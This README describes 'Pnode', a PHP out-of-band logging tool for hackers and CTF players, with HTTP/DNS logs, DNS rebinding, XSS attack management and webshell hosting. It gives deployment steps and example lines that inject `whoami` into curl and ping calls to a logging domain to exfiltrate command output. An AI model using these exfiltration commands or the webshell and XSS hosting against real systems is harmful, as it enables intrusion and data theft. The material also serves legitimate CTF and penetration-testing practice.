```
   ___                 _      
  / _ \_ __   ___   __| | ___ 
 / /_)/ '_ \ / _ \ / _` |/ _ \
/ ___/| | | | (_) | (_| |  __/
\/    |_| |_|\___/ \__,_|\___|
                              
```

ps: 请使用chrome浏览器

更新日志:

```
2019-01-19 首次公开
2019-03-19 增加DNS rebinding
2019-07-13 修改部分bug,增加Dockerfile,默认账号密码:pnode/pnode
```

### 项目名称

Pnode

### 项目描述

前端使用Boostrap框架，后端使用thinkphp5框架开发

适用于hacker&CTFer

可以满足日常的需求，并且可以直接在WEB端管理&编辑一些文件用于远程加载

登陆路径: /public/index.php/index/admin/index.html

### 功能介绍

* HTTP log
* DNS log
* XSS攻击管理模块
* WebShell等文件管理模块

```
curl http://127.0.0.1:10082/public/?c=`whoami`
```



![](http://p0desta-pictures.test.upcdn.net/20190614112000.png)



```
ping -c 2 `whoami`.pnode.tk
```



![](http://p0desta-pictures.test.upcdn.net/20190614112245.png)

![](http://p0desta-pictures.test.upcdn.net/20190614112021.png)

![](http://p0desta-pictures.test.upcdn.net/20190614112034.png)





### 环境部署

LAMP环境即可

修改database.php中数据库账号密码

自行修改默认登陆密码(md5后的)

```
update users set password=md5('admin') where username='admin'
```

如果需要DNS log功能,首先`https://my.freenom.com/`注册一个账号,然后免费申请一个域名



![](http://p0desta-pictures.test.upcdn.net/20190614112047.png)

然后将你的vps的外网ip填入

然后一直继续即可

然后将dns.py放入到`/tmp`目录下

修改dns.py为你的域名和你的vps ip,然后手动启动dns服务

```
nohup python /tmp/dns.py &
```

在一个小时左右将会解析成功,然后就可以接受到log。


* PS:部分模块代码取自火日师傅项目,感谢。
